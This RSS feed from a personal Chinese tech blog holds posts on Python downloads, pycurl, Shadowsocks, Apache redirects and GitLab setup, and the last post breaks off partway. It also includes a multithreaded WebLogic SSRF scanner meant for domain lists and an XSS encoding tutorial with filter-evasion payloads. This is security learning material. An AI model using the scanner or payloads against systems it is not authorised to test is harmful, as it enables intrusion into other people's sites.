<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Posts on </title>
    <link>http://wyb0.com/posts/</link>
    <description>Recent content in Posts on </description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>&amp;copy; 2016-2017 Reber. All Rights Reserved.</copyright>
    <lastBuildDate>Sat, 15 Apr 2017 18:49:37 +0800</lastBuildDate>
    <atom:link href="http://wyb0.com/posts/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>下载大文件时显示进度条</title>
      <link>http://wyb0.com/posts/python-module-tqdm/</link>
      <pubDate>Sat, 15 Apr 2017 18:49:37 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/python-module-tqdm/</guid>
      <description>

&lt;h3 id=&#34;0x00-作用:9abec5d792acd822401093e6d9bba107&#34;&gt;0x00 作用&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;在下载大文件时以进度条的形式显示下载进度，如下图所示：

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/tqdm_progress_bar.png&#34; alt=&#34;下载进度条&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x01-代码:9abec5d792acd822401093e6d9bba107&#34;&gt;0x01 代码&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
from tqdm import tqdm

def get_vedio(url,name):
    resp = requests.get(url=url,stream=True)
    content_size = int(resp.headers[&#39;Content-Length&#39;])/1024
    with open(name, &amp;quot;wb&amp;quot;) as f:
        print &amp;quot;total: &amp;quot;,content_size,&#39;k&#39;
        for data in tqdm(iterable=resp.iter_content(1024),total=content_size,unit=&#39;k&#39;):
            f.write(data)
        print &amp;quot;done &amp;quot;+name


if __name__ == &#39;__main__&#39;:
    url = &amp;quot;http://127.0.0.1/Video.mp4&amp;quot;
    name = url.split(&#39;/&#39;)[-1]
    get_vedio(url,name)
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
    <item>
      <title>检测WebLogic是否存在SSRF</title>
      <link>http://wyb0.com/posts/weblogic-ssrf-check/</link>
      <pubDate>Fri, 14 Apr 2017 14:43:52 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/weblogic-ssrf-check/</guid>
      <description>

&lt;h3 id=&#34;0x00-检测脚本如下:9126f36678ee6a89ae5be2ddcd4f1837&#34;&gt;0x00 检测脚本如下&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python  
# -*- coding: utf-8 -*-

import re
import sys
import Queue
import requests
import threading

from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

queue = Queue.Queue()
mutex = threading.Lock()

class Weblogic_SSRF_Check(threading.Thread):
    &amp;quot;&amp;quot;&amp;quot;docstring for Weblogic_SSRF_Check&amp;quot;&amp;quot;&amp;quot;
    def __init__(self, queue):
        threading.Thread.__init__(self)
        self.queue = queue

    def check(self,domain,ip):
        payload = &amp;quot;uddiexplorer/SearchPublicRegistries.jsp?operator={ip}&amp;amp;rdoSearch=name&amp;amp;txtSearchname=sdf&amp;amp;txtSearchkey=&amp;amp;txtSearchfor=&amp;amp;selfor=Business+location&amp;amp;btnSubmit=Search&amp;quot;.format(ip=ip)
        url = domain + payload

        try:
            html = requests.get(url=url, timeout=15, verify=False).content

            m = re.search(&#39;weblogic.uddi.client.structures.exception.XML_SoapException&#39;,html)
            if m:
                mutex.acquire()
                with open(&#39;ssrf.txt&#39;,&#39;a+&#39;) as f:
                    print &amp;quot;%s has weblogic ssrf.&amp;quot; % domain
                    f.write(&amp;quot;%s has weblogic ssrf.\n&amp;quot; % domain)
                mutex.release()
        except Exception,e:
            pass

    def get_registry(self,domain):
        payload = &#39;uddiexplorer/SetupUDDIExplorer.jsp&#39;
        url = domain + payload

        try:
            html = requests.get(url=url, timeout=15, verify=False).content
            m = re.search(&#39;&amp;lt;i&amp;gt;For example: (.*?)/uddi/uddilistener.*?&amp;lt;/i&amp;gt;&#39;,html)
            if m:
                return m.group(1)
        except Exception,e:
            pass

    def run(self):
        while not self.queue.empty():
            domain = self.queue.get()
            mutex.acquire()
            print domain
            mutex.release()
            ip = self.get_registry(domain)
            self.check(domain,ip)

            self.queue.task_done()


if __name__ == &#39;__main__&#39;:
    with open(&#39;domain.txt&#39;,&#39;r&#39;) as f:
        lines = f.readlines()
    for line in lines:
        queue.put(line.strip())

    for x in xrange(1,50):
        t = Weblogic_SSRF_Check(queue)
        t.setDaemon(True)
        t.start()
    queue.join()
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
    <item>
      <title>XSS中的编码</title>
      <link>http://wyb0.com/posts/xss-encode/</link>
      <pubDate>Thu, 30 Mar 2017 15:25:37 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/xss-encode/</guid>
      <description>

&lt;blockquote&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/anime/anime006.jpg&#34; alt=&#34;攻壳机动队&#34;&gt;
&lt;/div&gt;

&lt;/blockquote&gt;

&lt;h3 id=&#34;0x00-浏览器解析:4bb57bf6ab3a9d0bfc8e05904244bb58&#34;&gt;0x00 浏览器解析&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;浏览器收到服务器发来的HTML内容，会从头解析，遇到&amp;lt;script&amp;gt;&amp;lt;/script&amp;gt;时，
会调用js脚本解析器来解析并执行脚本，然后继续解析其他的HTML内容，
对于需要触发才能执行的事件，当事件触发时脚本解析器才会解析其中的脚本，
在这之前它是HTML的一部分
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x01-一些编码:4bb57bf6ab3a9d0bfc8e05904244bb58&#34;&gt;0x01 一些编码&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;URL编码&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;%+字符的ASCII编码对应的两位十六进制，如&amp;quot;/&amp;quot;的url编码为&amp;quot;%2F&amp;quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;HTML编码&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;实体编码&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;amp;开头分号结尾，如 &amp;quot;&amp;lt;&amp;quot; 的编码是 &amp;quot;&amp;amp;lt;&amp;quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;字符编码&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;样式为&amp;quot;&amp;amp;#数值;&amp;quot;，数值可为10进制、16进制ASCII编码或unicode字符编码
如&amp;quot;&amp;lt;&amp;quot;可编码为&amp;quot;&amp;amp;#060;&amp;quot;和&amp;quot;&amp;amp;#x3c;&amp;quot;，但是必须在属性值里面
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;JS编码&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;1、两个十六进制数字，如果不够个数，前面补0，例如&amp;quot;&amp;lt;&amp;quot;编码为&amp;quot;\x3c&amp;quot;
2、三个八进制数字，如果不够个数，前面补0，例如&amp;quot;&amp;lt;&amp;quot;编码为&amp;quot;\074&amp;quot;
3、四个十六进制数字，如果不够个数，前面补0，例如&amp;quot;&amp;lt;&amp;quot;编码为&amp;quot;\u003c&amp;quot;
4、对于一些控制字符，使用特殊的C类型的转义风格（例如\n和\r）
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;CSS编码&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;反斜线(\)后跟1~6位的16进制数字，如&amp;quot;e&amp;quot;为&amp;quot;\65&amp;quot;或&amp;quot;65&amp;quot;或&amp;quot;00065&amp;quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;0x02-编码与解码顺序:4bb57bf6ab3a9d0bfc8e05904244bb58&#34;&gt;0x02 编码与解码顺序&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;解码时先解码最外层，编码时先编码最内层&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;如&amp;lt;td onclick=&amp;quot;openUrl(add.do?userName=&#39;{$value}&#39;);&amp;quot;&amp;gt;11&amp;lt;/td&amp;gt;，
首先value出现在url中，而url在js中，而js又是html一部分，所以
解码顺序为：html解码-&amp;gt;js解码-&amp;gt;url解码
编码顺序为：url编码-&amp;gt;js编码-&amp;gt;html编码
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x03-利用:4bb57bf6ab3a9d0bfc8e05904244bb58&#34;&gt;0x03 利用&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;八进制&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;p id=&amp;quot;test&amp;quot;&amp;gt;&amp;lt;/p&amp;gt;
&amp;lt;script type=&amp;quot;text/javascript&amp;quot;&amp;gt;
var test = &amp;quot;\74\151\155\147\40\163\162\143\75\170\40\157\156\145\162\162\157\162\75\141\154\145\162\164\50\61\51\76&amp;quot;;
var p = document.getElementById(&#39;test&#39;); #这里会进行js解码
p.innerHTML = test;
&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;十进制和十六进制&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;img src=x onerror=&amp;quot;\u0061\u006c\u0065\u0072\u0074(1)&amp;quot;&amp;gt;
&amp;lt;img src=x onerror=&amp;quot;&amp;amp;#97;&amp;amp;#108;&amp;amp;#101;&amp;amp;#114;&amp;amp;#116;&amp;amp;#40;&amp;amp;#49;&amp;amp;#41;&amp;quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;javascript协议&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;a href=&amp;quot;javascript:alert(1)&amp;quot;&amp;gt;xxx&amp;lt;/a&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;data协议&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;a href=&amp;quot;data:text/html,&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&amp;quot;&amp;gt;xxxxxx&amp;lt;/a&amp;gt;
&amp;lt;a href=&amp;quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&amp;quot;&amp;gt;111&amp;lt;/a&amp;gt;
&amp;lt;meta http-equiv=&amp;quot;refresh&amp;quot; content=&amp;quot;x;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&amp;quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;html5新增实体编码&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;a href=&amp;quot;javasc&amp;amp;NewLine;ript&amp;amp;colon;alert(1)&amp;quot;&amp;gt;aaaa&amp;lt;/a&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;多次编码&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;点击后跳转到url，进行url解码
&amp;lt;a href=&amp;quot;javascript:%61lert(1)&amp;quot;&amp;gt;xxxx&amp;lt;/a&amp;gt;
先最外围的html解码，然后href里的url解码
&amp;lt;a href=&amp;quot;j&amp;amp;#x0061;vascript:&amp;amp;#x25;61lert(1)&amp;quot;&amp;gt;click me&amp;lt;/a&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>Python的pycurl模块</title>
      <link>http://wyb0.com/posts/python-module-pycurl/</link>
      <pubDate>Tue, 21 Mar 2017 23:18:50 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/python-module-pycurl/</guid>
      <description>

&lt;h3 id=&#34;0x00-关于curl:46b9206b28e9bd86a84e3bbeef60e037&#34;&gt;0x00 关于cURL&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;cURL可以使用URL的语法模拟浏览器来传输数据，它支持FTP、FTPS、HTTP、HTTPS、GOPHER、TELNET、DICT、FILE以及LDAP等多种协议。

利用cURL可以实现：HTTPS认证、HTTP POST方法、HTTP PUT方法、FTP上传、keyberos认证、代理服务器、cookies、用户名/密码认证、下载文件断点续传、上传文件断点续传、http代理服务器管道等等。
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x01-pycurl常见方法:46b9206b28e9bd86a84e3bbeef60e037&#34;&gt;0x01 pycurl常见方法&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;创建curl对象&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;c = pycurl.Curl()    #创建一个curl对象 
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
&lt;li&gt;设置请求&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;c.setopt(pycurl.URL,&amp;quot;http://www.baidu.com&amp;quot;)      #指定请求的URL
c.setopt(pycurl.CONNECTTIMEOUT, 5)    #连接的等待时间，设置为0则不等待
c.setopt(pycurl.TIMEOUT, 5)           #请求超时时间
c.setopt(pycurl.USERAGENT,&amp;quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:46.0) Gecko/20100101 Firefox/46.0&amp;quot;)    #配置User-Agent

c.setopt(pycurl.NOPROGRESS, 0)        #是否屏蔽下载进度条，非0则屏蔽
c.setopt(pycurl.MAXREDIRS, 5)         #指定HTTP重定向的最大数
c.setopt(pycurl.FORBID_REUSE, 1)      #完成交互后强制断开连接，不重用
c.setopt(pycurl.FRESH_CONNECT,1)      #强制获取新的连接，即替代缓存中的连接
c.setopt(pycurl.DNS_CACHE_TIMEOUT,60) #设置保存DNS信息的时间，默认为120秒

c.setopt(pycurl.HEADERFUNCTION, getheader)   #将返回的HTTP HEADER定向到回调函数getheader
c.setopt(pycurl.WRITEFUNCTION, getbody)      #将返回的内容定向到回调函数getbody
c.setopt(pycurl.WRITEHEADER, fileobj)        #将返回的HTTP HEADER定向到fileobj文件对象
c.setopt(pycurl.WRITEDATA, fileobj)          #将返回的HTML内容定向到fileobj文件对象
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
&lt;li&gt;部分返回信息&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;c.getinfo(pycurl.HTTP_CODE)         #返回的HTTP状态码
c.getinfo(pycurl.HEADER_SIZE)       #HTTP头部大小
c.getinfo(pycurl.TOTAL_TIME)        #传输结束所消耗的总时间
c.getinfo(pycurl.NAMELOOKUP_TIME)   #DNS解析所消耗的时间
c.getinfo(pycurl.CONNECT_TIME)      #建立连接所消耗的时间
c.getinfo(pycurl.PRETRANSFER_TIME)  #从建立连接到准备传输所消耗的时间
c.getinfo(pycurl.STARTTRANSFER_TIME)#从建立连接到传输开始消耗的时间
c.getinfo(pycurl.REDIRECT_TIME)     #重定向所消耗的时间
c.getinfo(pycurl.SIZE_UPLOAD)       #上传数据包大小
c.getinfo(pycurl.SIZE_DOWNLOAD)     #下载数据包大小
c.getinfo(pycurl.SPEED_DOWNLOAD)    #平均下载速度
c.getinfo(pycurl.SPEED_UPLOAD)      #平均上传速度
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x02-简单使用:46b9206b28e9bd86a84e3bbeef60e037&#34;&gt;0x02 简单使用&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python
# -*- coding: utf-8 -*-

import pycurl
import StringIO

buf = StringIO.StringIO()
c = pycurl.Curl()
c.setopt(pycurl.URL, &amp;quot;http://127.0.0.1/site/range/sqli/sqli1.php&amp;quot;)
c.setopt(pycurl.TIMEOUT, 15)
c.setopt(pycurl.FOLLOWLOCATION, 1) #允许跟踪来源
c.setopt(pycurl.MAXREDIRS, 5)
c.setopt(pycurl.SSL_VERIFYPEER, 0)
c.setopt(pycurl.SSL_VERIFYHOST, 0)
c.setopt(pycurl.USERAGENT,&amp;quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:46.0) Gecko/20100101 Firefox/46.0&amp;quot;)
c.setopt(pycurl.WRITEFUNCTION, buf.write) #将返回的内容定向到回调函数write

c.perform()
status_code = c.getinfo(pycurl.HTTP_CODE)       #返回的HTTP状态码
content_size = c.getinfo(pycurl.SIZE_DOWNLOAD)  #返回的数据的大小
content =buf.getvalue()
print status_code
print content_size
print content
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
    <item>
      <title>在vps上搭建Shadowsocks</title>
      <link>http://wyb0.com/posts/vps-set-up-shadowsocks/</link>
      <pubDate>Fri, 10 Mar 2017 10:34:40 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/vps-set-up-shadowsocks/</guid>
      <description>

&lt;blockquote&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/anime/anime005.jpg&#34; alt=&#34;某科学的超电磁炮&#34;&gt;
&lt;/div&gt;

&lt;/blockquote&gt;

&lt;h3 id=&#34;0x00-环境:487026c9bd645bc9e85d0aa006fda7c8&#34;&gt;0x00 环境&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;Ubuntu 14.04.1 LTS&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x01-安装与配置:487026c9bd645bc9e85d0aa006fda7c8&#34;&gt;0x01 安装与配置&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;reber@localhost:~$ sudo apt-get update
reber@localhost:~$ python --version
Python 2.7.6
reber@localhost:~$ sudo apt-get install python-gevent python-pip
reber@localhost:~$ sudo pip install shadowsocks
reber@localhost:~$ vim /home/reber/shadowsocks.json
    {
        &amp;quot;server&amp;quot;:&amp;quot;服务器 IP 地址&amp;quot;, # 服务器 IP (IPv4/IPv6)
        &amp;quot;server_port&amp;quot;:8388, # 监听的服务器端口
        &amp;quot;local_address&amp;quot;: &amp;quot;127.0.0.1&amp;quot;, # 本地监听的 IP 地址
        &amp;quot;local_port&amp;quot;:1080, # 本地端端口
        &amp;quot;password&amp;quot;:&amp;quot;mypassword&amp;quot;, # 密码
        #&amp;quot;port_password&amp;quot;:
        #{
        #    &amp;quot;40001&amp;quot;: &amp;quot;password1&amp;quot;,
        #    &amp;quot;40002&amp;quot;: &amp;quot;password2&amp;quot;,
        #    &amp;quot;40003&amp;quot;: &amp;quot;password3&amp;quot;
        #},
        #&amp;quot;_comment&amp;quot;:
        #{
        #    &amp;quot;40001&amp;quot;: &amp;quot;xiaoming&amp;quot;,
        #    &amp;quot;40002&amp;quot;: &amp;quot;lilei&amp;quot;,
        #    &amp;quot;40003&amp;quot;: &amp;quot;mike&amp;quot;
        #}
        &amp;quot;timeout&amp;quot;:300, # 超时时间（秒）
        &amp;quot;method&amp;quot;:&amp;quot;aes-256-cfb&amp;quot;, # 加密方式
        # 若Linux内核在3.7+，可开启fast_open降低延迟
        # 开启方法：echo 3 &amp;gt; /proc/sys/net/ipv4/tcp_fastopen
        &amp;quot;fast_open&amp;quot;: false, 
        &amp;quot;workers&amp;quot;: 1 # works数量，默认为 1
    }
reber@localhost:~$ sudo apt-get install python-m2crypto
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x02-服务端启动:487026c9bd645bc9e85d0aa006fda7c8&#34;&gt;0x02 服务端启动&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;# 前台运行
reber@localhost:~$ sudo ssserver -c /home/reber/shadowsocks.json
# 后台运行
reber@localhost:~$ sudo nohup ssserver -c /home/reber/shadowsocks.json &amp;gt; /dev/null 2&amp;gt;&amp;amp;1 &amp;amp;
# 关闭服务
reber@localhost:~$ sudo killall ssserver 
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;0x03-本地使用:487026c9bd645bc9e85d0aa006fda7c8&#34;&gt;0x03 本地使用&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;添加如下配置

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/use_ss.png&#34; alt=&#34;使用Shadowsocks&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
    <item>
      <title>301重定向</title>
      <link>http://wyb0.com/posts/301-redirect/</link>
      <pubDate>Tue, 07 Feb 2017 10:49:38 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/301-redirect/</guid>
      <description>

&lt;h3 id=&#34;0x00-目的:f68ab9b693c03a46b923f356015810f8&#34;&gt;0x00 目的&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;由于博客更换了域名，原来百度收录的都成了死链，所以做一下301重定向
我使用的是github搭建的博客，都是html的文件，先把html文件都上传到自己的服务器上，
修改dns使原域名指向服务器，让百度收录的链接都能够访问，然后设置301

服务器环境：Ubuntu 14.04.5、Apache2
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x01-开启rewrite模块:f68ab9b693c03a46b923f356015810f8&#34;&gt;0x01 开启rewrite模块&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;$ sudo a2enmod rewrite
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x02-根目录下新建-htaccess:f68ab9b693c03a46b923f356015810f8&#34;&gt;0x02 根目录下新建.htaccess：&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;Options +FollowSymLinks
RewriteEngine on
RewriteRule ^(.*)$ http://wyb0.com/$1 [L,R=301]  # 这里换上新域名
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x03-修改配置文件:f68ab9b693c03a46b923f356015810f8&#34;&gt;0x03 修改配置文件&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;# AllowOverride None 改为AllowOverride All

$ sudo vim /etc/apache2/apache2.conf
&amp;lt;Directory /var/www/&amp;gt;
    Options FollowSymLinks
    AllowOverride All
    Require all granted
&amp;lt;/Directory&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x04-重启apache:f68ab9b693c03a46b923f356015810f8&#34;&gt;0x04 重启Apache&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;$ sudo /etc/init.d/apache2 restart
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
    <item>
      <title>Ubuntu下部署Gitlab</title>
      <link>http://wyb0.com/posts/ubuntu-set-up-gitlab/</link>
      <pubDate>Mon, 16 Jan 2017 20:18:05 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/ubuntu-set-up-gitlab/</guid>
      <description>

&lt;blockquote&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/anime/anime004.jpg&#34; alt=&#34;钢之炼金术师FA&#34;&gt;
&lt;/div&gt;

&lt;/blockquote&gt;

&lt;h3 id=&#34;0x00-前期准备:2c00bdbbba3f3b03c9fb3c86a2b9779b&#34;&gt;0x00 前期准备&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;# 环境 Ubuntu 14.04
reber@ubuntu:~/Desktop$ sudo apt-get install openssh-server
reber@ubuntu:~/Desktop$ sudo apt-get install openssh-client
reber@ubuntu:~/Desktop$ sudo apt-get install git
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x01-安装:2c00bdbbba3f3b03c9fb3c86a2b9779b&#34;&gt;0x01 安装&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;reber@ubuntu:~/Desktop$ wget https://mirrors.tuna.tsinghua.edu.cn/gitlab-ce/ubuntu/pool/trusty/main/g/gitlab-ce/gitlab-ce_8.8.0-ce.0_amd64.deb
reber@ubuntu:~/Desktop$ sudo dpkg -i gitlab-ce_8.8.0-ce.0_amd64.deb
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x02-配置:2c00bdbbba3f3b03c9fb3c86a2b9779b&#34;&gt;0x02 配置&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;reber@ubuntu:~/Desktop$ sudo vim /etc/gitlab/gitlab.rb
    external_url &#39;http://192.168.188.160:80&#39;
    ......
    gitlab_rails[&#39;time_zone&#39;] = &#39;Asia/Shanghai&#39;
    gitlab_rails[&#39;gitlab_email_from&#39;] = &#39;xxxxxx@163.com&#39;
    ......
    gitlab_rails[&#39;smtp_enable&#39;] = true
    gitlab_rails[&#39;smtp_address&#39;] = &amp;quot;smtp.163.com&amp;quot;
    gitlab_rails[&#39;smtp_port&#39;] = 25
    gitlab_rails[&#39;smtp_user_name&#39;] = &amp;quot;xxxxxx@163.com&amp;quot;
    gitlab_rails[&#39;smtp_password&#39;] = &amp;quot;111111&amp;quot; # 客户端授权密码
    gitlab_rails[&#39;smtp_domain&#39;] = &amp;quot;163.com&amp;quot;
    gitlab_rails[&#39;smtp_authentication&#39;] = &amp;quot;login&amp;quot;
    gitlab_rails[&#39;smtp_enable_starttls_auto&#39;] = true
    ......
    user[&amp;quot;git_user_email&amp;quot;] = &amp;quot;xxxxxx@163.com&amp;quot;
# 只要修改配置文件就要reconfigure
reber@ubuntu:~/Desktop$ sudo gitlab-ctl reconfigure 
reber@ubuntu:~/Desktop$ sudo gitlab-ctl status
run: gitlab-workhorse: (pid 15918) 16s; run: log: (pid 15290) 200s
run: logrotate: (pid 15310) 187s; run: log: (pid 15309) 187s
run: nginx: (pid 15297) 193s; run: log: (pid 15296) 193s
run: postgresql: (pid 15169) 258s; run: log: (pid 15168) 258s
run: redis: (pid 15076) 269s; run: log: (pid 15075) 269s
run: sidekiq: (pid 15384) 141s; run: log: (pid 15279) 206s
run: unicorn: (pid 15360) 158s; run: log: (pid 15246) 212s
reber@ubuntu:~/Desktop$ netstat -anlt
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address       Foreign Address      State
tcp        0      0 127.0.0.1:8080      0.0.0.0:*            LISTEN
tcp        0      0 0.0.0.0:80          0.0.0.0:*            LISTEN
tcp        0      0 127.0.1.1:53        0.0.0.0:*            LISTEN
tcp        0      0 0.0.0.0:22          0.0.0.0:*            LISTEN

# 其中8080是unicore的端口
# 80是nginx的端口，nginx反向代理ruby开的web服务unicore
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x03-访问web页面:2c00bdbbba3f3b03c9fb3c86a2b9779b&#34;&gt;0x03 访问web页面&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;有时出现502，可以刷新网页或者再次reconfigure&lt;/li&gt;
&lt;li&gt;有时需要sudo gitlab-ctl restart nginx&lt;/li&gt;
&lt;li&gt;初次访问Web页面会强制让你改密码，初始用户名/密码：root/5iveL!fe&lt;/li&gt;
&lt;li&gt;禁止前台注册&lt;br /&gt;
登录后：右上角 Admin Area &amp;ndash;&amp;gt; Settings &amp;ndash;&amp;gt; Sign-in Restrictions

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/gitlab_forbid_registration.png&#34; alt=&#34;禁止前台注册&#34;&gt;
&lt;/div&gt;

然后保存&lt;/li&gt;
&lt;li&gt;修改admin的邮箱&lt;br /&gt;
Admin Area &amp;ndash;&amp;gt; Users &amp;ndash;&amp;gt; Edit 然后保存&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;0x04-添加401认证:2c00bdbbba3f3b03c9fb3c86a2b9779b&#34;&gt;0x04 添加401认证&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;# 401认证是nginx的，如果gitlab出现漏洞，也需要过401才行
reber@ubuntu:~/Desktop$ cd /var/opt/gitlab/
# 安装软件apache2-utils，用于生成认证的密码文件
reber@ubuntu:/var/opt/gitlab$ sudo apt-get install apache2-utils
reber@ubuntu:/var/opt/gitlab$ sudo ls nginx/conf/
gitlab-http.conf  nginx.conf
reber@ubuntu:/var/opt/gitlab$ sudo htpasswd -b -c nginx/conf/htpasswd username password
